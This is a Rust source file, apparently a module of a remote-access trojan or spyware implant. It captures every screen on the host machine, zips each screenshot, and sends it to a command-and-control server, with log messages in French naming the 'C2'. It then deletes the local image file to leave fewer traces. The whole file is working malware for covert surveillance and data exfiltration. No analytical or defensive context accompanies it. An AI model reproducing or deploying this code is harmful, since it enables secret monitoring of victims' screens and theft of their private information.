use crate::connexion::{self, zip_file};
use anyhow::Result;
use chrono::Local;
use screenshots::Screen;
use std::path::PathBuf;

fn build_temp_path_with_timestamp() -> PathBuf {
    let timestamp = Local::now()
        .format("screenshot_%d-%m-%Y_%H-%M-%S.png")
        .to_string();
    let mut file_path = std::env::temp_dir();
    file_path.push(timestamp);
    file_path
}

pub async fn take_screenshot() -> Result<()> {
    println!("[screenshot] Début de la capture...");
    let screens = Screen::all()?;
    println!("[screenshot] {} écrans détectés", screens.len());

    for (i, screen) in screens.iter().enumerate() {
        println!("[screenshot] Capture écran {}", i);
        let image = match screen.capture() {
            Ok(img) => {
                println!("[screenshot] Écran {} capturé: {}x{}", i, img.width(), img.height());
                img
            },
            Err(e) => {
                eprintln!("[screenshot] Erreur capture écran {}: {}", i, e);
                return Err(e);
            }
        };

        let file_path = build_temp_path_with_timestamp();
        println!("[screenshot] Sauvegarde dans: {:?}", file_path);

        if let Err(e) = image.save(&file_path) {
            eprintln!("Erreur lors de la sauvegarde de l'image : {}", e);
            continue;
        }
        
        println!("[screenshot] Image sauvegardée, traitement...");

        if let Err(e) = process_screenshot(&file_path).await {
            eprintln!("Erreur lors du traitement de la capture : {}", e);
        }
    }

    println!("[screenshot] Capture terminée");
    Ok(())
}

async fn process_screenshot(png_path: &PathBuf) -> Result<(), Box<dyn std::error::Error>> {
    println!("[screenshot] Début du zipping...");
    let zip_file = zip_file(png_path).await?;
    let zip_path = zip_file.path();
    println!("[screenshot] ZIP créé: {:?}", zip_path);

    println!("[screenshot] Envoi du ZIP au C2...");
    connexion::send_zip_to_c2(zip_path).await?;
    println!("[screenshot] ZIP envoyé au C2");

    std::fs::remove_file(png_path)?;
    println!("[screenshot] Fichier PNG supprimé");

    Ok(())
}
